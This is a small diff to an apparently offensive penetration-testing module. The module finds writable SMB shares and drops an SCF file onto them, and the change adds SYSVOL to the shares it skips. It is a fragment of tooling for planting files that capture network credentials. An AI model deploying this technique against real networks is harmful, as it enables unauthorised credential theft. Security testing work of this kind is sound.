@@ -59,11 +59,7 @@ class NXCModule:
     def on_login(self, context, connection):
         shares = connection.shares()
         for share in shares:
-            if "WRITE" in share["access"] and share["name"] not in [
-                "C$",
-                "ADMIN$",
-                "NETLOGON",
-            ]:
+            if "WRITE" in share["access"] and share["name"] not in ["C$", "ADMIN$", "NETLOGON", "SYSVOL"]:
                 context.log.success(f"Found writable share: {share['name']}")
                 if not self.cleanup:
                     with open(self.scf_path, "rb") as scf:
